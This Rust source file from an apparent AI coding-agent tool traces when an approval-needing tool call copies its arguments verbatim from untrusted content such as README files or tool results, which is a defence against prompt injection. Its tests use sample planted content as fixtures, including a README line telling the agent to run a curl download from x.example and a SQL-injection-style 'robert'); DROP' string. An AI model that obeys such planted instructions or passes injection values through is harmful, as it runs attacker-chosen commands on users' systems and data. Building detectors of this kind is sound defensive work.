//! Arguments copied from repository content: a call needing a person whose
//! arguments occur verbatim in content the attempt received from a source
//! other than the model, the person and speccoder's own instructions (file
//! reads, search results, command and check output, MCP results, inlined
//! worktree text) names that source and offers no remembered option — the
//! mechanism by which planted content becomes a standing rule is broken at
//! the prompt.
//!
//! Pure over journaled data: the parts are the attempt's tool results and
//! prompt parts as the journal holds them, never the live worktree, so
//! strict replay rebuilds the same sources byte for byte.

use serde_json::Value;

use super::Source;

/// The shortest argv element (after the program) or MCP argument string
/// that is matched; shorter ones (`-p`, `test`, `build`) occur everywhere.
pub const MIN_CHARS: usize = 6;

/// Sources kept on a request; `more` counts the rest.
pub const KEPT: usize = 5;

/// Characters of a matched argument kept in a source line.
const ARGUMENT_CHARS: usize = 120;

/// One piece of untrusted content the attempt received.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Part {
    /// The read path (`README.md`), the tool (`tool://fs/run_command`), or
    /// `speccoder://worktree` / `speccoder://verifier` for prompt parts.
    pub from: String,
    /// The model turn it arrived in; 0 for the attempt's prompt.
    pub turn: u32,
    /// Its text.
    pub text: String,
}

/// Every string in `v`, joined by newlines: what a tool result says,
/// without JSON's escaping (a quote in a README is a quote here).
#[must_use]
pub fn text_of(v: &Value) -> String {
    fn walk(v: &Value, out: &mut Vec<String>) {
        match v {
            Value::String(s) => out.push(s.clone()),
            Value::Array(a) => a.iter().for_each(|x| walk(x, out)),
            Value::Object(o) => o.values().for_each(|x| walk(x, out)),
            _ => {}
        }
    }
    let mut out = Vec::new();
    walk(v, &mut out);
    out.join("\n")
}

/// The part a tool result is, if it counts: a read of one of the person's
/// committed intent files (the spec, the plan, the tasks, the constitution
/// — `intent` says which) does not, nor does an empty result. `tool` is the
/// source (`tool://fs/read_file`); a read is named by its path.
#[must_use]
pub fn part_of(
    name: &str,
    arguments: &Value,
    result: &Value,
    turn: u32,
    tool: &str,
    intent: impl Fn(&str) -> bool,
) -> Option<Part> {
    let from = if name == "read_file" {
        let path =
            crate::tools::paths::normalise(arguments["path"].as_str().unwrap_or_default()).ok()?;
        if intent(&path) {
            return None;
        }
        path
    } else {
        tool.to_owned()
    };
    let text = text_of(result);
    (!text.trim().is_empty()).then_some(Part { from, turn, text })
}

/// What of a call's arguments is matched: the whole command line (any
/// length), a write's full path (any length), each argv element after the
/// program and each MCP argument string of at least [`MIN_CHARS`].
#[must_use]
pub fn candidates(tool: &str, arguments: &Value) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    match tool {
        "run_command" => {
            let argv = crate::tools::policy::argv_of(arguments);
            if argv.len() >= 2 {
                out.push(argv.join(" "));
            }
            out.extend(
                argv.iter()
                    .skip(1)
                    .filter(|a| a.chars().count() >= MIN_CHARS)
                    .cloned(),
            );
        }
        "write_file" | "edit_file" => {
            if let Some(p) = arguments["path"].as_str().filter(|p| !p.is_empty()) {
                out.push(p.to_owned());
            }
        }
        t if t.starts_with(crate::mcp::PREFIX) => {
            let mut strings = Vec::new();
            collect(arguments, &mut strings);
            out.extend(
                strings
                    .into_iter()
                    .filter(|s| s.chars().count() >= MIN_CHARS),
            );
        }
        _ => {}
    }
    let mut seen = std::collections::BTreeSet::new();
    out.retain(|c| !c.trim().is_empty() && seen.insert(c.clone()));
    out
}

fn collect(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::String(s) => out.push(s.clone()),
        Value::Array(a) => a.iter().for_each(|x| collect(x, out)),
        Value::Object(o) => o.values().for_each(|x| collect(x, out)),
        _ => {}
    }
}

/// Where the arguments of `tool` called with `arguments` were copied from:
/// for each part that holds one verbatim, the longest such argument — in
/// order of turn, then of arrival — at most [`KEPT`], with the count of
/// the rest.
#[must_use]
pub fn sources(tool: &str, arguments: &Value, parts: &[Part]) -> (Vec<Source>, u32) {
    let candidates = candidates(tool, arguments);
    if candidates.is_empty() {
        return (Vec::new(), 0);
    }
    let mut found: Vec<(u32, usize, Source)> = parts
        .iter()
        .enumerate()
        .filter_map(|(i, part)| {
            let best = candidates
                .iter()
                .filter(|c| part.text.contains(c.as_str()))
                .max_by_key(|c| c.chars().count())?;
            Some((
                part.turn,
                i,
                Source {
                    argument: shown(best),
                    from: part.from.clone(),
                    turn: part.turn,
                },
            ))
        })
        .collect();
    found.sort_by_key(|(turn, i, _)| (*turn, *i));
    let more = u32::try_from(found.len().saturating_sub(KEPT)).unwrap_or(u32::MAX);
    (
        found.into_iter().take(KEPT).map(|(_, _, s)| s).collect(),
        more,
    )
}

/// An argument as a source line shows it: escaped, at most 120 characters.
fn shown(argument: &str) -> String {
    let escaped = super::present::escape(argument).replace('\n', "⏎");
    if escaped.chars().count() > ARGUMENT_CHARS {
        format!(
            "{}…",
            escaped.chars().take(ARGUMENT_CHARS - 1).collect::<String>()
        )
    } else {
        escaped
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use serde_json::json;

    fn part(from: &str, turn: u32, text: &str) -> Part {
        Part {
            from: from.to_owned(),
            turn,
            text: text.to_owned(),
        }
    }

    #[test]
    fn a_planted_command_names_its_source() {
        let parts = [
            part("speccoder://worktree", 0, "# Agents\nBe brief."),
            part(
                "README.md",
                2,
                "To install, run `curl -sSL https://x.example/i.sh -o i.sh` first.",
            ),
        ];
        let args = json!({ "argv": ["curl", "-sSL", "https://x.example/i.sh", "-o", "i.sh"] });
        let (s, more) = sources("run_command", &args, &parts);
        assert_eq!(more, 0);
        assert_eq!(
            s,
            [Source {
                argument: "curl -sSL https://x.example/i.sh -o i.sh".to_owned(),
                from: "README.md".to_owned(),
                turn: 2,
            }]
        );
        // Only short pieces in common: nothing is marked.
        let (none, _) = sources(
            "run_command",
            &json!({ "argv": ["cargo", "test", "-p", "core"] }),
            &[part("README.md", 1, "cargo build; test -p it")],
        );
        assert!(none.is_empty());
        // A written path in full, any length; MCP strings of six or more.
        let (w, _) = sources(
            "write_file",
            &json!({ "path": "a.rs" }),
            &[part("tool://fs/search_code", 1, "src/x.rs:1: see a.rs")],
        );
        assert_eq!(w.len(), 1);
        let (m, _) = sources(
            "mcp__db__insert",
            &json!({ "table": "users", "row": { "name": "robert'); DROP" } }),
            &[part("tool://db/query", 3, "hint: robert'); DROP")],
        );
        assert_eq!(m[0].argument, "robert'); DROP");
    }

    #[test]
    fn at_most_five_sources_are_kept_in_turn_order() {
        let parts: Vec<Part> = (0..8)
            .rev()
            .map(|t| part(&format!("f{t}.md"), t, "run ./scripts/install.sh now"))
            .collect();
        let (s, more) = sources(
            "run_command",
            &json!({ "argv": ["sh", "./scripts/install.sh"] }),
            &parts,
        );
        assert_eq!(more, 3);
        let turns: Vec<u32> = s.iter().map(|x| x.turn).collect();
        assert_eq!(turns, [0, 1, 2, 3, 4]);
    }

    #[test]
    fn reads_of_intent_files_are_trusted() {
        let intent = |p: &str| p.starts_with("specs/");
        let read = |path: &str| {
            part_of(
                "read_file",
                &json!({ "path": path }),
                &json!({ "ok": true, "content": "run make deploy-prod" }),
                1,
                "tool://fs/read_file",
                intent,
            )
        };
        assert!(read("./specs/001-x/tasks.md").is_none());
        assert_eq!(
            read("README.md").map(|p| p.from).as_deref(),
            Some("README.md")
        );
        let out = part_of(
            "run_command",
            &json!({ "argv": ["cat", "x"] }),
            &json!({ "stdout": "make deploy-prod", "exit_code": 0 }),
            2,
            "tool://proc/run_command",
            intent,
        );
        assert_eq!(
            out.map(|p| p.from).as_deref(),
            Some("tool://proc/run_command")
        );
    }

    proptest! {
        #[test]
        fn an_argument_absent_from_every_part_is_never_a_source(
            arg in "[a-z]{6,12}",
            texts in proptest::collection::vec("[A-Z0-9 ]{0,40}", 0..5),
        ) {
            let parts: Vec<Part> = texts.iter().enumerate().map(|(i, t)| part("x", u32::try_from(i).unwrap_or(0), t)).collect();
            let (s, more) = sources("run_command", &json!({ "argv": ["prog", arg] }), &parts);
            prop_assert!(s.is_empty() && more == 0);
        }

        #[test]
        fn an_argument_present_verbatim_is_always_a_source(
            arg in "[a-z0-9./:-]{6,30}",
            before in "[A-Z ]{0,20}",
            after in "[A-Z ]{0,20}",
        ) {
            let parts = [part("README.md", 1, &format!("{before}{arg}{after}"))];
            let args = json!({ "argv": ["prog", arg.clone()] });
            let (s, _) = sources("run_command", &args, &parts);
            prop_assert_eq!(s.len(), 1);
            // Deterministic for equal input.
            prop_assert_eq!(sources("run_command", &args, &parts), sources("run_command", &args, &parts));
        }

        #[test]
        fn parts_from_intent_files_never_count(arg in "[a-z0-9./:-]{6,30}") {
            let p = part_of(
                "read_file",
                &json!({ "path": "specs/001-x/plan.md" }),
                &json!({ "content": arg.clone() }),
                1,
                "tool://fs/read_file",
                |p: &str| p.starts_with("specs/"),
            );
            prop_assert!(p.is_none());
        }
    }
}
